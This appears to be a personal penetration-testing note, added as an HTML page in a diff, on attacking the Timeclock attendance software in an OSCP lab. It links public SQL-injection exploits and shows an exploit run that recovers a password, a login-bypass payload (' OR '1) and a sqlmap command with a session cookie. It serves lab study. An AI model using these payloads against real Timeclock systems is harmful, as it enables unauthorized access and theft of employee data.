@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Timeclock</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Timeclock</h1></strong><br /><a href="http://timeclock-software.net/">http://timeclock-software.net/</a><br />Timeclock is an employee time and attendance system that keeps track of when your employees sign in and out of work.<br /><br /><strong>Examples</strong><br />• oscp 10.11.1.252 - fw_dev<br /><br /><strong><h2>## Exploits</h2></strong><br />• <a href="https://www.exploit-db.com/exploits/39404">https://www.exploit-db.com/exploits/39404</a> - Lots of SQL inject vulnerabilities<br />• <a href="https://cxsecurity.com/issue/WLB-2016010155">https://cxsecurity.com/issue/WLB-2016010155</a> - Blind SQL injection<br /><br /><strong><h3>### Login Form</h3></strong><br />The login form is vulnerable to time-based SQL injection.<br /><a href="https://github.com/timip/exploit/blob/master/timeclock.py">https://github.com/timip/exploit/blob/master/timeclock.py</a><br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.252]<br />└──╼&nbsp;#python&nbsp;timeclock.py&nbsp;10.11.1.252&nbsp;8000<br />Running!<br />GY5sziW2uP9LHyv<br />Done!&nbsp;Try&nbsp;Harder!</div></div><br /><br />You can also manually SQL inject into it.<br /><div class="codebox"><div class="codebox">admin<br />&#39;&nbsp;OR&nbsp;&#39;1</div></div><br /><br /><strong><h3>### edit_type.php</h3></strong><br />The <code>edit_type.php</code> file is accessible once you&#39;ve logged in.<br />It&#39;s vulnerable to SQL injection.<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.252]<br />└──╼&nbsp;#sqlmap&nbsp;-u&nbsp;&#39;http://10.11.1.252:8000/edit_type.php?type_id=5&#39;&nbsp;--dbms=mysql&nbsp;--cookie=&quot;security=low;&nbsp;PHPSESSID=vhcp55ofaaj5o6b5rkd7n8ved4&quot;</div></div><br /></div>
+</body>
+</html>
